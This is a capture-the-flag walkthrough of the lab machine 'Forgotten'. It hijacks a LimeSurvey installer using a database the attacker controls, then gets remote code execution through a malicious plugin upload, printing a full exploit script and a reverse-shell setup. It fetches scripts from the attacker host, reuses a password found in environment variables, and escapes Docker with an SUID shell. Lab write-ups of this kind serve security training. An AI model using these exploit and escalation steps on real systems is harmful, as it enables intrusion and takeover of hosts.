# Forgotten - Easy

```sh
sudo vim /etc/hosts
# add forgotten.htb

nmap -T4 -p- -A -Pn -v forgotten.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    * 80/tcp - http - Apache httpd 2.4.56

* the webpage gives a 403 Forbidden error on accessing it - we need to enumerate this further for any secrets

* web enum:

    ```sh
    gobuster dir -u http://forgotten.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx,js,json,docx,pdf,cgi,sql,xml,tar,gz,db -t 25
    # dir scan with short wordlist and multiple extensions

    ffuf -c -u 'http://forgotten.htb' -H 'Host: FUZZ.forgotten.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 20 -s
    # subdomain scan
    ```

* ```gobuster``` finds a directory /survey - this leads to 'http://forgotten.htb/survey/index.php?r=installer/welcome', a page for LimeSurvey installer

* Google shows that LimeSurvey is a free online survey tool

* as we have the option to start installation for LimeSurvey, we can start this and go through the installer step-by-step:

    * select the option 'Start Installation' and accept the license

    * in the next step, in pre-installation check, we get LimeSurvey version 6.3.7 and PHP version 8.0.30

    * Googling for exploits associated with LimeSurvey 6.3.7 does not give anything, so we need to continue with the installer

    * DB configuration needs the following fields:

        * database type - MySQL
        * database location - localhost
        * database user - we can fill this as 'root'
        * database password - we do not know the password so we can try 'root'
        * database name - we can give any name like 'limesurvey'
    
    * in the next step, the installer attempts to create the DB 'limesurvey', but it fails and returns to the DB configuration step due to invalid creds

    * using common creds like 'root:root', 'root:toor', 'root:mysql' do not help

* in the LimeSurvey installation, during the DB configuration step, the DB location allows to enter any IP for the database server; the field takes 'localhost' by default

* we can attempt to submit our IP such that the installation works on an attacker-controlled DB, and we can complete the installation

* setup MySQL:

    ```sh
    which mysql
    # mysql is already installed

    sudo systemctl status mysql
    # MariaDB service is inactive, disabled

    sudo systemctl status mariadb
    # alt command, linked to same mysql service

    # to make sure the DB is accessible remotely, and not locally
    # we need to change the binding address

    sudo vim /etc/mysql/mariadb.conf.d/50-server.cnf
    # change bind address from 127.0.0.1 to 0.0.0.0

    sudo systemctl start mariadb
    # 'mysql' service can also be started for the same result

    sudo mysql -u root -p
    # no password by default
    # we are able to access MariaDB

    # create a new DB and a new user
    create database testdb;

    create user 'myuser'@'%' identified by 'mypassword';
    # the '%' is to indicate that user can connect from any host

    grant all privileges on testdb.* to 'myuser'@'%';

    flush privileges;
    ```

* after setting up the MySQL service on our box, we can resume the installation for LimeSurvey:

    * in the DB configuration step, enter the following values:

        * DB location - 10.10.14.9
        * DB user - myuser
        * DB password - mypassword
        * DB name - testdb
    
    * on clicking next step, this time the installer confirms the DB already exists, as we created it earlier, so the installer can populate the DB now

    * after a few minutes, this step gets completed and the DB is populated

    * in administrator settings, we can modify the admin login details - we can change the creds to 'admin:password' and any email like 'admin@forgotten.htb' and complete the installation

* once the installation is completed, we have admin access on the LimeSurvey instance, and we get access to the admin page at 'http://forgotten.htb/survey/index.php/admin' - we can login with the creds 'admin:password'

* we have access to the LimeSurvey admin interface - we can check for any clues here

* the footer discloses the exact version - LimeSurvey Community Edition Version 6.3.7+231127

* Googling for this version gives results for CVE-2021-44967, an authenticated plugin RCE

* while the version does not match, we can follow and try [this exploit by uploading a malicious plugin](https://ine.com/blog/cve-2021-44967-limesurvey-rce):

    * download 'config.xml', 'exploit.py' and 'php-rev.php' from [the exploit repo](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)

    * edit the 'config.xml' file to update the version - the exploit file has '5.0' as its version, but this instance is on 6.3.7, so we need to update the version; otherwise the exploit will not work:

        ```sh
        vim config.xml
        ```

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <config>
            <metadata>
                <name>Y1LD1R1M</name>
                <type>plugin</type>
                <creationDate>2020-03-20</creationDate>
                <lastUpdate>2020-03-31</lastUpdate>
                <author>Y1LD1R1M</author>
                <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
                <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
                <version>6.0</version>
                <license>GNU General Public License version 2 or later</license>
                <description>
                        <![CDATA[Author : Y1LD1R1M]]></description>
            </metadata>

            <compatibility>
                <version>3.0</version>
                <version>4.0</version>
                <version>5.0</version>
                <version>6.0</version>
            </compatibility>
            <updaters disabled="disabled"></updaters>
        </config>
        ```

    * edit the 'php-rev.php' file and update the values for IP and port:

        ```sh
        vim php-rev.php
        # change the values of IP and port
        ```
    
    * create the ZIP file with the same name as the exploit code - and archive these two files:

        ```sh
        zip -r Y1LD1R1M.zip config.xml php-rev.php
        # zip the XML and PHP file

        unzip -t Y1LD1R1M.zip
        # test the zip file
        ```

    * in admin dashboard, navigate to Configuration > Plugins

    * click on 'Upload & install' option and upload the malicious plugin ZIP file

    * confirm the uploaded plugin by installing it

    * after installing the plugin, find the plugin ID by hovering over the plugin name - the ID is seen in its hyperlink; in this case, we have plugin ID 18

    * to activate the plugin, we need to update the exploit script first - change the lines with the comments as needed:

        ```sh
        vim exploit.py
        ```

        ```py
        import requests
        import sys
        import warnings
        from bs4 import BeautifulSoup

        warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
        print("_______________LimeSurvey RCE_______________")
        print("")
        print("")
        print("Usage: python exploit.py URL username password port")
        print("Example: python exploit.py http://192.26.26.128 admin password 80")
        url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        port = sys.argv[4]

        req = requests.session()
        print("[+] Retrieving CSRF token...")
        loginPage = req.get(url+"/index.php/admin/authentication/sa/login")
        response = loginPage.text
        s = BeautifulSoup(response, 'html.parser')
        CSRF_token = s.findAll('input')[0].get("value")
        print(CSRF_token)
        print("[+] Sending Login Request...")

        login_creds = {
                "user": username,
                "password": password,
                "authMethod": "Authdb",
                "loginlang":"default",
                "action":"login",
                "width":"1581",
                "login_submit": "login",
                "YII_CSRF_TOKEN": CSRF_token
        }
        print("[+]Login Successful")
        print("")
        print("[+] Upload Plugin Request...")
        print("[+] Retrieving CSRF token...")
        filehandle = open("/home/sv/forgotten/Y1LD1R1M.zip",mode = "rb") # CHANGE THIS
        login = req.post(url+"/index.php/admin/authentication/sa/login" ,data=login_creds)
        UploadPage = req.get(url+"/index.php/admin/pluginmanager/sa/index")
        response = UploadPage.text
        s = BeautifulSoup(response, 'html.parser')
        CSRF_token2 = s.findAll('input')[0].get("value")
        print(CSRF_token2)
        Upload_creds = {
                "YII_CSRF_TOKEN":CSRF_token2,
                "lid":"$lid",
                "action": "templateupload"
        }
        file_upload= req.post(url+"/index.php/admin/pluginmanager?sa=upload",files = {'the_file':filehandle},data=Upload_creds)
        UploadPage = req.get(url+"/index.php/admin/pluginmanager?sa=uploadConfirm")
        response = UploadPage.text
        print("[+] Plugin Uploaded Successfully")
        print("")
        print("[+] Install Plugin Request...")
        print("[+] Retrieving CSRF token...")

        InstallPage = req.get(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin")
        response = InstallPage.text
        s = BeautifulSoup(response, 'html.parser')
        CSRF_token3 = s.findAll('input')[0].get("value")
        print(CSRF_token3)
        Install_creds = {
                "YII_CSRF_TOKEN":CSRF_token3,
                "isUpdate": "false"
        }
        file_install= req.post(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin",data=Install_creds)
        print("[+] Plugin Installed Successfully")
        print("")
        print("[+] Activate Plugin Request...")
        print("[+] Retrieving CSRF token...")
        ActivatePage = req.get(url+"/index.php/admin/pluginmanager?sa=activate")
        response = ActivatePage.text
        s = BeautifulSoup(response, 'html.parser')
        CSRF_token4 = s.findAll('input')[0].get("value")
        print(CSRF_token4)
        Activate_creds = {
                "YII_CSRF_TOKEN":CSRF_token4,
                "pluginId": "18" # CHANGE THIS
        }
        file_activate= req.post(url+"/index.php/admin/pluginmanager?sa=activate",data=Activate_creds) 
        print("[+] Plugin Activated Successfully")
        print("")
        print("[+] Reverse Shell Starting, Check Your Connection :)")
        shell= req.get(url+"/upload/plugins/Y1LD1R1M/php-rev.php") # CHANGE THIS
        ```
    
    * after modifying the exploit, we can run the script for RCE:

        ```sh
        nc -nvlp 4444
        # setup listener

        python3 exploit.py http://forgotten.htb/survey admin password 80
        ```
    
    * the exploit is a bit slow, but it works, and we get reverse shell on our listener

* in reverse shell:

    ```sh
    id
    # 'limesvc' user

    pwd
    # '/'

    hostname
    # randomly generated hostname

    ls -la /
    # includes '.dockerenv' - this shows we are in a Docker container

    ls -la /home
    # only one user 'limesvc'

    ls -la /home/limesvc
    # no user flag here
    ```

* the user flag is not present in the Docker container - this means we need to escape it to get to the actual host:

    ```sh
    hostname -i
    # 172.17.0.2
    # this indicates the host could be on 172.17.0.1 or another subnet

    ls -la /var/www/
    # check webroot

    ls -la /var/www/html

    ls -la /var/www/html/survey
    # check for any secrets

    ls -la /var/www/html/survey/application/config
    # check config files
    ```

* checking the LimeSurvey config does not give anything as most of it is from the installation we did

* we can do basic enum using ```linpeas``` - fetch the script from attacker:

    ```sh
    cd /tmp

    curl http://10.10.14.9:8000/linpeas.sh -o linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-1033-aws
    * sudo version 1.9.5p2
    * 'limesvc' is part of 'sudo' group
    * env variables show a variable 'LIMESURVEY_PASS'

* checking the non-default env variable 'LIMESURVEY_PASS', it gives us the password '5W5HN4K4GCXf9E'

* we can check if this is the password of user 'limesvc' and find the output of ```sudo -l``` - but we need to upgrade our shell first:

    ```sh
    which python3
    # not available

    which python
    # python not available

    which script
    # script is available

    /usr/bin/script -qc /bin/bash /dev/null
    export TERM=xterm
    # Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice
    stty cols 132 rows 34

    sudo -l
    # the password works here
    ```

* ```sudo -l``` shows that we can run all commands as all users, as we are part of the 'sudo' group

* we can use this to escalate to root:

    ```sh
    sudo bash
    # we get root shell

    ls -la /root
    # no clues
    ```

* as we are root now, we can attempt to escape the Docker container

* before that, we can attempt credential re-use via SSH:

    ```sh
    # on attacker
    ssh limesvc@forgotten.htb
    # using the same password works

    hostname
    # 'forgotten'
    # this confirms we are on the main host

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # cannot run sudo here

    # we can use linpeas for enum again

    wget http://10.10.14.9:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 6.8.0-1033-aws, Ubuntu 22.04.5
    * sudo version 1.9.9
    * Docker version 27.5.1
    * another user 'ubuntu' present on box
    * ```/var/backups``` includes a non-default folder 'hygiene'
    * ```/opt``` includes multiple pages

* we cannot read the contents of ```/home/ubuntu```, and the ```/var/backups/hygiene``` folder is empty

* checking the ```/opt``` directory, it includes a folder for 'limesurvey' too - on a closer look, it seems to be the exact folder as the one in the Docker container

* so, ```/opt/limesurvey``` is mounted on the Docker container at ```/var/www/html/survey```

* as we have root on the Docker container, and access to the host machine as well, we can use [this privesc vector to set SUID shell in the Docker container as root, to the shared folder, and access it as the non-privileged user](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells-and-host-mount):

    ```sh
    # in host, as non-privileged user
    # copy shell to mounted folder

    cp /bin/bash /opt/limesurvey/bash
    # copy in actual host, as the bash binaries might differ
    ```

    ```sh
    # in Docker container, as root
    # change ownership and set the SUID bit for the shell in the shared folder

    chown root:root /var/www/html/survey/bash

    chmod 4777 /var/www/html/survey/bash
    ```

    ```sh
    # in host
    /opt/limesurvey/bash -p
    # run with privileged flag

    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
